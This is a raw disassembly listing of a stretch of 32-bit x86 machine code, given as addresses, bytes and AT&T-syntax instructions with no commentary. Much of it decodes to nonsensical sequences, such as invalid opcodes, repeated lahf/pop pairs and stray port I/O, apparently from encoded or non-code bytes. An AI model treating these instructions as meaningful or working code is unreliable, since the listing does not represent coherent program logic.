  409858:	2b a5 70 b0 2d b5    	sub    -0x4ad24f90(%ebp),%esp
  40985e:	68 eb a6 48 5b       	push   $0x5b48a6eb
  409863:	2d 9f 5f 2b b5       	sub    $0xb52b5f9f,%eax
  409868:	68 eb 67 b9 88       	push   $0x88b967eb
  40986d:	34 42                	xor    $0x42,%al
  40986f:	5f                   	pop    %edi
  409870:	9f                   	lahf
  409871:	eb a7                	jmp    0x40981a
  409873:	48                   	dec    %eax
  409874:	3d 2c 9f 5f 24       	cmp    $0x245f9f2c,%eax
  409879:	20 af e5 18 5f 9f    	and    %ch,-0x60a0e71b(%edi)
  40987f:	5f                   	pop    %edi
  409880:	2b 67 f0             	sub    -0x10(%edi),%esp
  409883:	01 0c 88             	add    %ecx,(%eax,%ecx,4)
  409886:	e1 60                	loope  0x4098e8
  409888:	f0 48                	lock dec %eax
  40988a:	db 34 9f             	(bad) (%edi,%ebx,4)
  40988d:	5f                   	pop    %edi
  40988e:	2b 67 88             	sub    -0x78(%edi),%esp
  409891:	e0 6c                	loopne 0x4098ff
  409893:	5f                   	pop    %edi
  409894:	9f                   	lahf
  409895:	e4 60                	in     $0x60,%al
  409897:	6f                   	outsl  %ds:(%esi),(%dx)
  409898:	24 5c                	and    $0x5c,%al
  40989a:	a0 60 a0 18 18       	mov    0x1818a060,%al
  40989f:	88 e1                	mov    %ah,%cl
  4098a1:	60                   	pusha
  4098a2:	88 32                	mov    %dh,(%edx)
  4098a4:	40                   	inc    %eax
  4098a5:	5f                   	pop    %edi
  4098a6:	9f                   	lahf
  4098a7:	48                   	dec    %eax
  4098a8:	d5 f0                	aad    $0xf0
  4098aa:	9f                   	lahf
  4098ab:	5f                   	pop    %edi
  4098ac:	2b 50 25             	sub    0x25(%eax),%edx
  4098af:	56                   	push   %esi
  4098b0:	1e                   	push   %ds
  4098b1:	d9 5b 61             	fstps  0x61(%ebx)
  4098b4:	a0 60 a0 ed f5       	mov    0xf5eda060,%al
  4098b9:	24 2b                	and    $0x2b,%al
  4098bb:	23 88 e0 30 5f 9f    	and    -0x60a0cf20(%eax),%ecx
  4098c1:	eb f5                	jmp    0x4098b8
  4098c3:	24 58                	and    $0x58,%al
  4098c5:	e0 25                	loopne 0x4098ec
  4098c7:	a0 a0 48 a7 05       	mov    0x5a748a0,%al
  4098cc:	9f                   	lahf
  4098cd:	5f                   	pop    %edi
  4098ce:	25 20 1e 8e 9f       	and    $0x9f8e1e20,%eax
  4098d3:	95                   	xchg   %eax,%ebp
  4098d4:	18 88 e1 60 08 ec    	sbb    %cl,-0x13f79f1f(%eax)
  4098da:	25 a0 a0 ed f5       	and    $0xf5eda0a0,%eax
  4098df:	20 2b                	and    %ch,(%ebx)
  4098e1:	23 88 ba 30 5f 9f    	and    -0x60a0cf46(%eax),%ecx
  4098e7:	5f                   	pop    %edi
  4098e8:	15 20 08 f8 25       	adc    $0x25f80820,%eax
  4098ed:	a0 a0 18 18 88       	mov    0x881818a0,%al
  4098f2:	e1 60                	loope  0x409954
  4098f4:	5a                   	pop    %edx
  4098f5:	64 a0 60 a0 48 5b    	mov    %fs:0x5b48a060,%al
  4098fb:	02 9f 5f 8b 87 9f    	add    -0x607874a1(%edi),%bl
  409901:	95                   	xchg   %eax,%ebp
  409902:	18 88 e1 60 08 e0    	sbb    %cl,-0x1ff79f1f(%eax)
  409908:	25 a0 a0 ed f5       	and    $0xf5eda0a0,%eax
  40990d:	1c 2b                	sbb    $0x2b,%al
  40990f:	23 88 8c 30 5f 9f    	and    -0x60a0cf74(%eax),%ecx
  409915:	5f                   	pop    %edi
  409916:	15 1c 58 d8 c8       	adc    $0xc8d8581c,%eax
  40991b:	a1 a0 1a a3 60       	mov    0x60a31aa0,%eax
  409920:	a0 60 88 f2 42       	mov    0x42f28860,%al
  409925:	5f                   	pop    %edi
  409926:	9f                   	lahf
  409927:	a3 ee d5 2c ed       	mov    %eax,0xed2cd5ee
  40992c:	ed                   	in     (%dx),%eax
  40992d:	18 d3                	sbb    %dl,%bl
  40992f:	32 41 d8             	xor    -0x28(%ecx),%al
  409932:	c8 a1 a0 48          	enter  $0xa0a1,$0x48
  409936:	b3 14                	mov    $0x14,%bl
  409938:	9f                   	lahf
  409939:	5f                   	pop    %edi
  40993a:	2b b5 58 18 18 88    	sub    -0x77e7e7a8(%ebp),%esi
  409940:	e1 60                	loope  0x4099a2
  409942:	88 e6                	mov    %ah,%dh
  409944:	40                   	inc    %eax
  409945:	5f                   	pop    %edi
  409946:	9f                   	lahf
  409947:	ca a1 ed             	lret   $0xeda1
  40994a:	f5                   	cmc
  40994b:	10 d3                	adc    %dl,%bl
  40994d:	20 88 4e 2f 5f 9f    	and    %cl,-0x60a0d0b2(%eax)
  409953:	eb e5                	jmp    0x40993a
  409955:	10 2d b5 54 48 e7    	adc    %ch,0xe74854b5
  40995b:	2a 9f 5f 2b a5 54    	sub    0x54a52b5f(%edi),%bl
  409961:	48                   	dec    %eax
  409962:	2b 03                	sub    (%ebx),%eax
  409964:	9f                   	lahf
  409965:	5f                   	pop    %edi
  409966:	f0 01 18             	lock add %ebx,(%eax)
  409969:	88 e1                	mov    %ah,%cl
  40996b:	60                   	pusha
  40996c:	88 e0                	mov    %ah,%al
  40996e:	43                   	inc    %ebx
  40996f:	5f                   	pop    %edi
  409970:	9f                   	lahf
  409971:	b0 2b                	mov    $0x2b,%al
  409973:	67 88 d8             	addr16 mov %bl,%al
  409976:	43                   	inc    %ebx
  409977:	5f                   	pop    %edi
  409978:	9f                   	lahf
  409979:	b0 2d                	mov    $0x2d,%al
  40997b:	ad                   	lods   %ds:(%esi),%eax
  40997c:	4c                   	dec    %esp
  40997d:	93                   	xchg   %eax,%ebx
  40997e:	72 18                	jb     0x409998
  409980:	44                   	inc    %esp
  409981:	e5 e0                	in     $0xe0,%eax
  409983:	60                   	pusha
  409984:	88 dc                	mov    %bl,%ah
  409986:	62 5f 9f             	bound  %ebx,-0x61(%edi)
  409989:	eb e5                	jmp    0x409970
  40998b:	0c 88                	or     $0x88,%al
  40998d:	c0 43 5f 9f          	rolb   $0x9f,0x5f(%ebx)
  409991:	b0 0a                	mov    $0xa,%al
  409993:	60                   	pusha
  409994:	88 34 69             	mov    %dh,(%ecx,%ebp,2)
  409997:	5f                   	pop    %edi
  409998:	9f                   	lahf
  409999:	93                   	xchg   %eax,%ebx
  40999a:	60                   	pusha
  40999b:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4099a0:	b0 4b                	mov    $0x4b,%al
  4099a2:	aa                   	stos   %al,%es:(%edi)
  4099a3:	49                   	dec    %ecx
  4099a4:	89 f9                	mov    %edi,%ecx
  4099a6:	9f                   	lahf
  4099a7:	5f                   	pop    %edi
  4099a8:	88 fc                	mov    %bh,%ah
  4099aa:	3b 5f 9f             	cmp    -0x61(%edi),%ebx
  4099ad:	93                   	xchg   %eax,%ebx
  4099ae:	60                   	pusha
  4099af:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4099b4:	b0 c8                	mov    $0xc8,%al
  4099b6:	e6 e5                	out    %al,$0xe5
  4099b8:	e0 60                	loopne 0x409a1a
  4099ba:	2d a5 4c 1a b5       	sub    $0xb51a4ca5,%eax
  4099bf:	60                   	pusha
  4099c0:	a0 60 88 36 3f       	mov    0x3f368860,%al
  4099c5:	5f                   	pop    %edi
  4099c6:	9f                   	lahf
  4099c7:	23 89 50 3a 5f 9f    	and    -0x60a0c5b0(%ecx),%ecx
  4099cd:	4b                   	dec    %ebx
  4099ce:	8b bf fe bb 2b 45    	mov    0x452bbbfe(%edi),%edi
  4099d4:	fd                   	std
  4099d5:	23 a0 60 a0 5f 9f    	and    -0x60a05fa0(%eax),%esp
  4099db:	5f                   	pop    %edi
  4099dc:	9f                   	lahf
  4099dd:	7c a0                	jl     0x40997f
  4099df:	60                   	pusha
  4099e0:	a0 a9 f8 d5 d4       	mov    0xd4d5f8a9,%al
  4099e5:	c9                   	leave
  4099e6:	06                   	push   %es
  4099e7:	90                   	nop
  4099e8:	05 8b e6 a1 19       	add    $0x19a1e68b,%eax
  4099ed:	b9 12 99 f9 d4       	mov    $0xd4f99912,%ecx
  4099f2:	18 ad f5 d1 e6 da    	sbb    %ch,-0x25192e0b(%ebp)
  4099f8:	d7                   	xlat   %ds:(%ebx)
  4099f9:	af                   	scas   %es:(%edi),%eax
  4099fa:	d5 cb                	aad    $0xcb
  4099fc:	f0 60                	lock pusha
  4099fe:	a0 60 a0 5f 9f       	mov    0x9f5fa060,%al
  409a03:	5f                   	pop    %edi
  409a04:	9f                   	lahf
  409a05:	61                   	popa
  409a06:	a0 60 a0 80 a0       	mov    0xa080a060,%al
  409a0b:	60                   	pusha
  409a0c:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  409a11:	62 a0 60 a0 80 c2    	bound  %esp,-0x3d7f5fa0(%eax)
  409a17:	60                   	pusha
  409a18:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  409a1d:	61                   	popa
  409a1e:	a0 60 a0 82 a0       	mov    0xa082a060,%al
  409a23:	60                   	pusha
  409a24:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  409a29:	77 a0                	ja     0x4099cb
  409a2b:	60                   	pusha
  409a2c:	a0 ce d3 cd d4       	mov    0xd4cdd3ce,%al
  409a31:	d2 e1                	shl    %cl,%cl
  409a33:	d8 0f                	fmuls  (%edi)
  409a35:	d2 08                	rorb   %cl,(%eax)
  409a37:	c9                   	leave
  409a38:	ed                   	in     (%dx),%eax
  409a39:	c4                   	(bad)
  409a3a:	f6 b1 ed d6 e9 aa    	divb   -0x55162913(%ecx)
  409a40:	06                   	push   %es
  409a41:	c4 03                	les    (%ebx),%eax
  409a43:	b0 a0                	mov    $0xa0,%al
  409a45:	b5 2b                	mov    $0x2b,%ch
  409a47:	4c                   	dec    %esp
  409a48:	d3 29                	shrl   %cl,(%ecx)
  409a4a:	f1                   	int1
  409a4b:	b1 f1                	mov    $0xf1,%cl
  409a4d:	b1 f1                	mov    $0xf1,%cl
  409a4f:	b1 f1                	mov    $0xf1,%cl
  409a51:	b1 f3                	mov    $0xf3,%cl
  409a53:	b6 f7                	mov    $0xf7,%dh
  409a55:	93                   	xchg   %eax,%ebx
  409a56:	60                   	pusha
  409a57:	b5 08                	mov    $0x8,%ch
  409a59:	2a 26                	sub    (%esi),%ah
  409a5b:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  409a60:	04 e9                	add    $0xe9,%al
  409a62:	c0 93 60 b5 08 05 26 	rclb   $0x26,0x508b560(%ebx)
  409a69:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  409a6e:	04 e9                	add    $0xe9,%al
  409a70:	c0 ca a1             	ror    $0xa1,%dl
  409a73:	ed                   	in     (%dx),%eax
  409a74:	ed                   	in     (%dx),%eax
  409a75:	50                   	push   %eax
  409a76:	d3 32                	shll   %cl,(%edx)
  409a78:	58                   	pop    %eax
  409a79:	40                   	inc    %eax
  409a7a:	26 a0 a0 48 23 21    	mov    %es:0x212348a0,%al
  409a80:	9f                   	lahf
  409a81:	5f                   	pop    %edi
  409a82:	2b a5 90 b0 2d a5    	sub    -0x5ad24f70(%ebp),%esp
  409a88:	8c 48 37             	mov    %cs,0x37(%eax)
  409a8b:	5b                   	pop    %ebx
  409a8c:	9f                   	lahf
  409a8d:	5f                   	pop    %edi
  409a8e:	2b a5 8c 93 69 ba    	sub    -0x45966c74(%ebp),%esp
  409a94:	88 90 71 5f 9f e9    	mov    %dl,-0x1660a08f(%eax)
  409a9a:	e5 5c                	in     $0x5c,%eax
  409a9c:	2b a5 9c 48 cd 11    	sub    0x11cd489c(%ebp),%esp
  409aa2:	9f                   	lahf
  409aa3:	5f                   	pop    %edi
  409aa4:	e8 e5 60 dc 13       	call   0x141cfb8e
  409aa9:	a0 29 a5 94 27       	mov    0x2794a529,%al
  409aae:	e5 58                	in     $0x58,%eax
  409ab0:	a0 60 a0 60 d3       	mov    0xd360a060,%al
  409ab5:	20 f5                	and    %dh,%ch
  409ab7:	c8 21 e6 e0          	enter  $0xe621,$0xe0
  409abb:	60                   	pusha
  409abc:	04 5f                	add    $0x5f,%al
  409abe:	d0 c4                	rol    $1,%ah
  409ac0:	29 80 0a 92 88 f0    	sub    %eax,-0xf776df6(%eax)
  409ac6:	4e                   	dec    %esi
  409ac7:	5f                   	pop    %edi
  409ac8:	9f                   	lahf
  409ac9:	ed                   	in     (%dx),%eax
  409aca:	ed                   	in     (%dx),%eax
  409acb:	48                   	dec    %eax
  409acc:	2b b5 98 eb e5 5c    	sub    0x5ce5eb98(%ebp),%esi
  409ad2:	88 aa 52 5f 9f eb    	mov    %ch,-0x1460a0ae(%edx)
  409ad8:	e5 48                	in     $0x48,%eax
  409ada:	88 0a                	mov    %cl,(%edx)
  409adc:	6a 5f                	push   $0x5f
  409ade:	9f                   	lahf
  409adf:	ed                   	in     (%dx),%eax
  409ae0:	ed                   	in     (%dx),%eax
  409ae1:	40                   	inc    %eax
  409ae2:	2b b5 98 eb e5 5c    	sub    0x5ce5eb98(%ebp),%esi
  409ae8:	88 94 52 5f 9f eb e5 	mov    %dl,-0x1a1460a1(%edx,%edx,2)
  409aef:	40                   	inc    %eax
  409af0:	2d b5 84 48 4d       	sub    $0x4d4884b5,%eax
  409af5:	28 9f 5f 2b a5 84    	sub    %bl,-0x7b5ad4a1(%edi)
  409afb:	48                   	dec    %eax
  409afc:	79 2a                	jns    0x409b28
  409afe:	9f                   	lahf
  409aff:	5f                   	pop    %edi
  409b00:	d3 20                	shll   %cl,(%eax)
  409b02:	fa                   	cli
  409b03:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  409b08:	8b 6a 89             	mov    -0x77(%edx),%ebp
  409b0b:	e2 38                	loop   0x409b45
  409b0d:	5f                   	pop    %edi
  409b0e:	9f                   	lahf
  409b0f:	48                   	dec    %eax
  409b10:	d5 fa                	aad    $0xfa
  409b12:	9f                   	lahf
  409b13:	5f                   	pop    %edi
  409b14:	9f                   	lahf
  409b15:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409b16:	98                   	cwtl
  409b17:	5f                   	pop    %edi
  409b18:	ed                   	in     (%dx),%eax
  409b19:	54                   	push   %esp
  409b1a:	15 f8 2b a5 9c       	adc    $0x9ca52bf8,%eax
  409b1f:	48                   	dec    %eax
  409b20:	b5 f6                	mov    $0xf6,%ch
  409b22:	9f                   	lahf
  409b23:	5f                   	pop    %edi
  409b24:	d3 20                	shll   %cl,(%eax)
  409b26:	fa                   	cli
  409b27:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  409b2c:	8b 6a 89             	mov    -0x77(%edx),%ebp
  409b2f:	be 38 5f 9f 48       	mov    $0x489f5f38,%esi
  409b34:	b1 fa                	mov    $0xfa,%cl
  409b36:	9f                   	lahf
  409b37:	5f                   	pop    %edi
  409b38:	d3 20                	shll   %cl,(%eax)
  409b3a:	fa                   	cli
  409b3b:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  409b40:	08 31                	or     %dh,(%ecx)
  409b42:	26 a0 a0 ed e5 40    	mov    %es:0x40e5eda0,%al
  409b48:	5a                   	pop    %edx
  409b49:	65 a0 60 a0 48 eb    	mov    %gs:0xeb48a060,%al
  409b4f:	fe                   	(bad)
  409b50:	9f                   	lahf
  409b51:	5f                   	pop    %edi
  409b52:	63 49 05             	arpl   %ecx,0x5(%ecx)
  409b55:	f9                   	stc
  409b56:	9f                   	lahf
  409b57:	5f                   	pop    %edi
  409b58:	8b 4b ff             	mov    -0x1(%ebx),%ecx
  409b5b:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  409b60:	63 5f 9f             	arpl   %ebx,-0x61(%edi)
  409b63:	5f                   	pop    %edi
  409b64:	9f                   	lahf
  409b65:	75 a0                	jne    0x409b07
  409b67:	60                   	pusha
  409b68:	a0 a8 0c af 12       	mov    0x12af0ca8,%al
  409b6d:	d9 07                	flds   (%edi)
  409b6f:	b9 ec d0 f2 a8       	mov    $0xa8f2d0ec,%ecx
  409b74:	d9 c5                	fld    %st(5)
  409b76:	cf                   	iret
  409b77:	d8 f7                	fdiv   %st(7),%st
  409b79:	97                   	xchg   %eax,%edi
  409b7a:	d9 cb                	fxch   %st(3)
  409b7c:	0a b0 a0 60 a0 b5    	or     -0x4a5f9f60(%eax),%dh
  409b82:	2b 4c 59 67          	sub    0x67(%ecx,%ebx,2),%ecx
  409b86:	a0 60 a0 ca a0       	mov    0xa0caa060,%al
  409b8b:	ca a0 a9             	lret   $0xa9a0
  409b8e:	15 59 f1 b3 f6       	adc    $0xf6b3f159,%eax
  409b93:	b7 d3                	mov    $0xd3,%bh
  409b95:	20 f5                	and    %dh,%ch
  409b97:	c8 71 e8 e0          	enter  $0xe871,$0xe0
  409b9b:	60                   	pusha
  409b9c:	04 5f                	add    $0x5f,%al
  409b9e:	d0 c4                	rol    $1,%ah
  409ba0:	29 80 d3 20 f5 c8    	sub    %eax,-0x370adf2d(%eax)
  409ba6:	3f                   	aas
  409ba7:	e8 e0 60 04 5f       	call   0x5f44fc8c
  409bac:	d0 c4                	rol    $1,%ah
  409bae:	29 80 2d a5 9c 48    	sub    %eax,0x489ca52d(%eax)
  409bb4:	d1 3d 9f 5f 9f d5    	sarl   $1,0xd59f5f9f
  409bba:	9c                   	pushf
  409bbb:	18 a3 60 a0 60 88    	sbb    %ah,-0x779f5fa0(%ebx)
  409bc1:	40                   	inc    %eax
  409bc2:	32 5f 9f             	xor    -0x61(%edi),%bl
  409bc5:	e3 60                	jecxz  0x409c27
  409bc7:	64 2d b5 98 48 e9    	fs sub $0xe94898b5,%eax
  409bcd:	18 9f 5f 9f d5 98    	sbb    %bl,-0x672a60a1(%edi)
  409bd3:	ed                   	in     (%dx),%eax
  409bd4:	ed                   	in     (%dx),%eax
  409bd5:	54                   	push   %esp
  409bd6:	d3 32                	shll   %cl,(%edx)
  409bd8:	58                   	pop    %eax
  409bd9:	48                   	dec    %eax
  409bda:	28 a0 a0 48 c3 20    	sub    %ah,0x20c348a0(%eax)
  409be0:	9f                   	lahf
  409be1:	5f                   	pop    %edi
  409be2:	9f                   	lahf
  409be3:	d5 94                	aad    $0x94
  409be5:	18 04 88             	sbb    %al,(%eax,%ecx,4)
  409be8:	e1 60                	loope  0x409c4a
  409bea:	5a                   	pop    %edx
  409beb:	63 a0 60 a0 48 65    	arpl   %esp,0x6548a060(%eax)
  409bf1:	ff 9f 5f 52 61 41    	lcall  *0x4161525f(%edi)
  409bf7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  409bf8:	d5 a0                	aad    $0xa0
  409bfa:	a0 48 d5 0e 9f       	mov    0x9f0ed548,%al
  409bff:	5f                   	pop    %edi
  409c00:	2b 38                	sub    (%eax),%edi
  409c02:	2d ad 90 93 72       	sub    $0x729390ad,%eax
  409c07:	18 a8 e9 e0 60 88    	sbb    %ch,-0x779f1f17(%eax)
  409c0d:	54                   	push   %esp
  409c0e:	5f                   	pop    %edi
  409c0f:	5f                   	pop    %edi
  409c10:	9f                   	lahf
  409c11:	eb f5                	jmp    0x409c08
  409c13:	50                   	push   %eax
  409c14:	2b 23                	sub    (%ebx),%esp
  409c16:	88 06                	mov    %al,(%esi)
  409c18:	50                   	push   %eax
  409c19:	5f                   	pop    %edi
  409c1a:	9f                   	lahf
  409c1b:	ed                   	in     (%dx),%eax
  409c1c:	ed                   	in     (%dx),%eax
  409c1d:	4c                   	dec    %esp
  409c1e:	d3 32                	shll   %cl,(%edx)
  409c20:	58                   	pop    %eax
  409c21:	90                   	nop
  409c22:	29 a0 a0 48 7b 1f    	sub    %esp,0x1f7b48a0(%eax)
  409c28:	9f                   	lahf
  409c29:	5f                   	pop    %edi
  409c2a:	2b b5 8c eb 63 48    	sub    0x4863eb8c(%ebp),%esi
  409c30:	2d 10 9f 5f 2d       	sub    $0x2d5f9f10,%eax
  409c35:	ad                   	lods   %ds:(%esi),%eax
  409c36:	84 93 72 18 f4 e9    	test   %dl,-0x160be78e(%ebx)
  409c3c:	e0 60                	loopne 0x409c9e
  409c3e:	88 22                	mov    %ah,(%edx)
  409c40:	5f                   	pop    %edi
  409c41:	5f                   	pop    %edi
  409c42:	9f                   	lahf
  409c43:	5f                   	pop    %edi
  409c44:	15 44 2d b5 80       	adc    $0x80b52d44,%eax
  409c49:	93                   	xchg   %eax,%ebx
  409c4a:	60                   	pusha
  409c4b:	48                   	dec    %eax
  409c4c:	91                   	xchg   %eax,%ecx
  409c4d:	ec                   	in     (%dx),%al
  409c4e:	9f                   	lahf
  409c4f:	5f                   	pop    %edi
  409c50:	9f                   	lahf
  409c51:	d5 80                	aad    $0x80
  409c53:	c8 18 e9 e0          	enter  $0xe918,$0xe0
  409c57:	60                   	pusha
  409c58:	2d a5 88 1a a3       	sub    $0xa31a88a5,%eax
  409c5d:	60                   	pusha
  409c5e:	a0 60 88 b4 3f       	mov    0x3fb48860,%al
  409c63:	5f                   	pop    %edi
  409c64:	9f                   	lahf
  409c65:	eb f5                	jmp    0x409c5c
  409c67:	48                   	dec    %eax
  409c68:	2b 23                	sub    (%ebx),%esp
  409c6a:	88 b2 50 5f 9f ed    	mov    %dh,-0x1260a0b0(%edx)
  409c70:	ed                   	in     (%dx),%eax
  409c71:	38 d3                	cmp    %dl,%bl
  409c73:	32 58 e4             	xor    -0x1c(%eax),%bl
  409c76:	29 a0 a0 48 27 1f    	sub    %esp,0x1f2748a0(%eax)
  409c7c:	9f                   	lahf
  409c7d:	5f                   	pop    %edi
  409c7e:	9f                   	lahf
  409c7f:	d5 78                	aad    $0x78
  409c81:	ed                   	in     (%dx),%eax
  409c82:	f5                   	cmc
  409c83:	34 d3                	xor    $0xd3,%al
  409c85:	20 88 16 2c 5f 9f    	and    %cl,-0x60a0d3ea(%eax)
  409c8b:	5f                   	pop    %edi
  409c8c:	15 34 2d ad 70       	adc    $0x70ad2d34,%eax
  409c91:	93                   	xchg   %eax,%ebx
  409c92:	72 18                	jb     0x409cac
  409c94:	50                   	push   %eax
  409c95:	e9 e0 60 88 c8       	jmp    0xc8c8fd7a
  409c9a:	5f                   	pop    %edi
  409c9b:	5f                   	pop    %edi
  409c9c:	9f                   	lahf
  409c9d:	5f                   	pop    %edi
  409c9e:	15 30 2d a5 7c       	adc    $0x7ca52d30,%eax
  409ca3:	1a a3 60 a0 60 88    	sbb    -0x779f5fa0(%ebx),%ah
  409ca9:	6c                   	insb   (%dx),%es:(%edi)
  409caa:	3f                   	aas
  409cab:	5f                   	pop    %edi
  409cac:	9f                   	lahf
  409cad:	eb f5                	jmp    0x409ca4
  409caf:	3c 2b                	cmp    $0x2b,%al
  409cb1:	23 88 6a 50 5f 9f    	and    -0x60a0af96(%eax),%ecx
  409cb7:	ed                   	in     (%dx),%eax
  409cb8:	ed                   	in     (%dx),%eax
  409cb9:	28 d3                	sub    %dl,%bl
  409cbb:	32 58 40             	xor    0x40(%eax),%bl
  409cbe:	29 a0 a0 48 df 1f    	sub    %esp,0x1fdf48a0(%eax)
  409cc4:	9f                   	lahf
  409cc5:	5f                   	pop    %edi
  409cc6:	9f                   	lahf
  409cc7:	d5 68                	aad    $0x68
  409cc9:	5f                   	pop    %edi
  409cca:	d5 c4                	aad    $0xc4
  409ccc:	c8 a1 a0 ed          	enter  $0xa0a1,$0xed
  409cd0:	ed                   	in     (%dx),%eax
  409cd1:	24 d3                	and    $0xd3,%al
  409cd3:	32 58 64             	xor    0x64(%eax),%bl
  409cd6:	2a a0 a0 48 c7 1f    	sub    0x1fc748a0(%eax),%ah
  409cdc:	9f                   	lahf
  409cdd:	5f                   	pop    %edi
  409cde:	9f                   	lahf
  409cdf:	d5 64                	aad    $0x64
  409ce1:	ed                   	in     (%dx),%eax
  409ce2:	e5 2c                	in     $0x2c,%eax
  409ce4:	5a                   	pop    %edx
  409ce5:	63 a0 60 a0 48 6b    	arpl   %esp,0x6b48a060(%eax)
  409ceb:	fe                   	(bad)
  409cec:	9f                   	lahf
  409ced:	5f                   	pop    %edi
  409cee:	2b b5 6c eb 63 48    	sub    0x4863eb6c(%ebp),%esi
  409cf4:	69 0f 9f 5f 2b 75    	imul   $0x752b5f9f,(%edi),%ecx
  409cfa:	04 88                	add    $0x88,%al
  409cfc:	e1 60                	loope  0x409d5e
  409cfe:	2b 23                	sub    (%ebx),%esp
  409d00:	88 38                	mov    %bh,(%eax)
  409d02:	4e                   	dec    %esi
  409d03:	5f                   	pop    %edi
  409d04:	9f                   	lahf
  409d05:	eb 63                	jmp    0x409d6a
  409d07:	48                   	dec    %eax
  409d08:	cd f4                	int    $0xf4
  409d0a:	9f                   	lahf
  409d0b:	5f                   	pop    %edi
  409d0c:	0a 61 0a             	or     0xa(%ecx),%ah
  409d0f:	60                   	pusha
  409d10:	d3 29                	shrl   %cl,(%ecx)
  409d12:	d3 32                	shll   %cl,(%edx)
  409d14:	41                   	inc    %ecx
  409d15:	c4                   	(bad)
  409d16:	c8 a1 a0 48          	enter  $0xa0a1,$0x48
  409d1a:	e3 29                	jecxz  0x409d45
  409d1c:	9f                   	lahf
  409d1d:	5f                   	pop    %edi
  409d1e:	d3 20                	shll   %cl,(%eax)
  409d20:	fa                   	cli
  409d21:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  409d26:	8b 6a 89             	mov    -0x77(%edx),%ebp
  409d29:	c4 36                	les    (%esi),%esi
  409d2b:	5f                   	pop    %edi
  409d2c:	9f                   	lahf
  409d2d:	48                   	dec    %eax
  409d2e:	b7 f8                	mov    $0xf8,%bh
  409d30:	9f                   	lahf
  409d31:	5f                   	pop    %edi
  409d32:	0a 60 88             	or     -0x78(%eax),%ah
  409d35:	28 4b 5f             	sub    %cl,0x5f(%ebx)
  409d38:	9f                   	lahf
  409d39:	b0 88                	mov    $0x88,%al
  409d3b:	82 4c 5f 9f 93       	orb    $0x93,-0x61(%edi,%ebx,2)
  409d40:	60                   	pusha
  409d41:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  409d46:	b0 c8                	mov    $0xc8,%al
  409d48:	78 e8                	js     0x409d32
  409d4a:	e0 60                	loopne 0x409dac
  409d4c:	2d a5 64 1a af       	sub    $0xaf1a64a5,%eax
  409d51:	60                   	pusha
  409d52:	a0 60 88 a4 3c       	mov    0x3ca48860,%al
  409d57:	5f                   	pop    %edi
  409d58:	9f                   	lahf
  409d59:	23 89 be 37 5f 9f    	and    -0x60a0c842(%ecx),%ecx
  409d5f:	4b                   	dec    %ebx
  409d60:	8b bf fe bb 2b 45    	mov    0x452bbbfe(%edi),%edi
  409d66:	fd                   	std
  409d67:	23 a0 5f 9f 5f 9f    	and    -0x60a060a1(%eax),%esp
  409d6d:	77 a0                	ja     0x409d0f
  409d6f:	60                   	pusha
  409d70:	a0 c2 18 c6 f2       	mov    0xf2c618c2,%al
  409d75:	af                   	scas   %es:(%edi),%eax
  409d76:	e4 d8                	in     $0xd8,%al
  409d78:	ed                   	in     (%dx),%eax
  409d79:	ae                   	scas   %es:(%edi),%al
  409d7a:	0b d0                	or     %eax,%edx
  409d7c:	18 a2 f0 c7 06 b0    	sbb    %ah,-0x4ff93810(%edx)
  409d82:	eb ab                	jmp    0x409d2f
  409d84:	09 b8 eb b0 a0 5f    	or     %edi,0x5fa0b0eb(%eax)
  409d8a:	9f                   	lahf
  409d8b:	5f                   	pop    %edi
  409d8c:	9f                   	lahf
  409d8d:	7c a0                	jl     0x409d2f
  409d8f:	60                   	pusha
  409d90:	a0 ad d2 a9 14       	mov    0x14a9d2ad,%al
  409d95:	b4 01                	mov    $0x1,%ah
  409d97:	b3 ec                	mov    $0xec,%bl
  409d99:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  409d9a:	f6 c3 11             	test   $0x11,%bl
  409d9d:	d9 e9                	fldl2t
  409d9f:	8f                   	(bad)
  409da0:	0f b2 09             	lss    (%ecx),%ecx
  409da3:	ce                   	into
  409da4:	11 cc                	adc    %ecx,%esp
  409da6:	08 aa ef a5 0d a6    	or     %ch,-0x59f25a11(%edx)
  409dac:	ef                   	out    %eax,(%dx)
  409dad:	60                   	pusha
  409dae:	a0 60 a0 5f 9f       	mov    0x9f5fa060,%al
  409db3:	5f                   	pop    %edi
  409db4:	9f                   	lahf
  409db5:	7b a0                	jnp    0x409d57
  409db7:	60                   	pusha
  409db8:	a0 a3 01 a9 d2       	mov    0xd2a901a3,%al
  409dbd:	a2 e4 a1 0c a3       	mov    %al,0xa30ca1e4
  409dc2:	e4 d9                	in     $0xd9,%al
  409dc4:	e5 94                	in     $0x94,%eax
  409dc6:	f7 93 07 97 19 b1    	notl   -0x4ee668f9(%ebx)
  409dcc:	15 a7 e4 b1 11       	adc    $0x11b1e4a7,%eax
  409dd1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409dd2:	f6 b0 a0 5f 9f 5f    	divb   0x5f9f5fa0(%eax)
  409dd8:	9f                   	lahf
  409dd9:	78 a0                	js     0x409d7b
  409ddb:	60                   	pusha
  409ddc:	a0 b7 d5 d6 e1       	mov    0xe1d6d5b7,%al
  409de1:	b5 d9                	mov    $0xd9,%ch
  409de3:	ac                   	lods   %ds:(%esi),%al
  409de4:	18 a5 f4 c1 11 92    	sbb    %ah,-0x6dee3e0c(%ebp)
  409dea:	e2 8f                	loop   0x409d7b
  409dec:	0d ca fa b1 02       	or     $0x2b1faca,%eax
  409df1:	97                   	xchg   %eax,%edi
  409df2:	f2 c6                	repnz (bad)
  409df4:	f0 60                	lock pusha
  409df6:	a0 60 a0 5f 9f       	mov    0x9f5fa060,%al
  409dfb:	5f                   	pop    %edi
  409dfc:	9f                   	lahf
  409dfd:	61                   	popa
